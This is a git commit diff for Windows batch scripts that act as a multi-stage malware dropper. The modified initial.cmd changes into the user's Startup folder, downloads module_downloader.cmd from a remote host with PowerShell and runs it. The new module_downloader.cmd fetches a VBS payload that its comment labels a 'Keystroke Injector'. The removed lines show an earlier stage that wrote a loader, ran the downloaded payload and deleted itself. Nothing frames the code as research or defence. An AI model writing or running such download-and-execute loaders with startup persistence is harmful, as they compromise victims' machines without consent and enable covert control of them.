4b8d79a56252e1840c29b761e82464fcdba0c16f
Oorth <arthmaurya@gmail.com>
2024-11-30 22:54:04 +0530

    now module_downloader is on server

--- initial.cmd
+++ initial.cmd
@@ -2,24 +2,9 @@
 
 SET currentDirectory=%cd%
 
-SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-cd %STARTUPPATH%
+SET TARGETDIR="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %TARGETDIR%
 
-
-@REM Wirtes the powershell script to download and run the payloads to a .cmd file called "stage2.cmd"
-(
-    @REM download the payload
-    echo powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/Basic_typr.vbs' -OutFile payload.vbs"
-    echo powershell Start-Sleep -Seconds 1
-    echo powershell ./payload.vbs
-    @REM run stage2
-    @REM powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"
-) > stage2.cmd
-
-powershell ./stage2.cmd
-del stage2.cmd
-
-@rem uncomment to make the script delete itself
-cd %currentDirectory%
-del initial.cmd
-
+@REM (
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/module_downloader.cmd' -OutFile module_downloader.cmd"
+module_downloader.cmd
---
+++ module_downloader.cmd
@@ -0,0 +1,19 @@
+@echo off
+
+@REM -------------------------------------------------------------------------------------------------------------------------------------
+@REM download Keystroke Injector
+powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/hello.vbs' -OutFile payload.vbs"
+@REM payload.vbs
+
+
+
+
+@REM -------------------------------------------------------------------------------------------------------------------------------------
+
+
+@REM (
+@REM     echo del module_downloader.cmd 
+@REM     echo 
+@REM     echo 
+@REM ) > del.cmd
+@REM del.cmd
